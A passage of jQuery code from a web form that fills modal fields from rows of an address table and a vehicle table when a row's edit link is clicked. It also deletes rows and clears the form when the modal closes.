                    direccion3 = $(this).find('td').eq(2).text();
                    direccion4 = $(this).find('td').eq(3).text();
                    direccion5 = $(this).find('td').eq(4).text();
                    direccion6 = $(this).find('td').eq(5).text();
                    direccion7 = $(this).find('td').eq(6).text();

                    direcciones = direccion0 + ';' + direccion1 + ';' + direccion2 + ';' + direccion3 + ';' + direccion4 + ';' + direccion5 + ';' + direccion6 + ';' + direccion7 + ';';

                    $("#city").val(direccion1);
                    $("#zip").val(direccion2);
                    $("#description").val(direccion3);
                    $("#address_1").val(direccion4);
                    $("#address_2").val(direccion5);
                    $("#phone_1").val(direccion6);
                    $("#cell_phone_1").val(direccion7);

                });

            });


            $("table#tab_vehiculo").on('click', 'a.editar', function () {

                posicion = $(this).closest('tr').index();

                $("#modal_vehiculo").modal('show');
                $("#posicion2").val(posicion);
                $("#accion2").val('Editar');
                $("span#titulo").text('Editar');

                $(this).closest('tr').each(function () {
                    var vehiculo0, vehiculo1, vehiculo2, vehiculo3, vehiculo4, vehiculo5;
                    vehiculo0 = $(this).attr('id');  // Código correlativo del registro en la tabla 
                    vehiculo1 = $(this).find('td').eq(0).text();
                    vehiculo2 = $(this).find('td').eq(1).text();
                    vehiculo3 = $(this).find('td').eq(2).text();
                    vehiculo4 = $(this).find('td').eq(3).text();
                    vehiculo5 = $(this).find('td').eq(4).text();

                    vehiculos = vehiculo0 + ';' + vehiculo1 + ';' + vehiculo2 + ';' + vehiculo3 + ';' + vehiculo4 + ';' + vehiculo5 + ';';

                    $("#trademark").val(vehiculo1);
                    $("#model").val(vehiculo2);
                    $("#color").val(vehiculo3);
                    $("#year").val(vehiculo4);
                    $("#license_plate").val(vehiculo5);


                });

            });

            $("table#tab_direccion").on('click', 'a.quitar', function () {


                var aPos = $("table#tab_direccion").dataTable().fnGetPosition(this.parentNode.parentNode);
                $("table#tab_direccion").dataTable().fnDeleteRow(aPos);


            });

            $("table#tab_vehiculo").on('click', 'a.quitar', function () {

                var aPos = $("table#tab_vehiculo").dataTable().fnGetPosition(this.parentNode.parentNode);
                $("table#tab_vehiculo").dataTable().fnDeleteRow(aPos);


            });

            $(".cerrar_modal").click(function () {
                $('#city').val('');
                $('#zip').val('');
                $('#phone_1').val('');
                $('#cell_phone_1').val('');
                $('#description').val('');
                $('#address_1').val('');
                $('#address_2').val('');
                $('#accion').val('');
                $('#posicion').val('');
                $("span#titulo").text('');
                $("#trademark").val('');
                $("#model").val('');
                $("#color").val('');
                $("#year").val('');
                $("#license_plate").val('');

            });





        });

    </script>

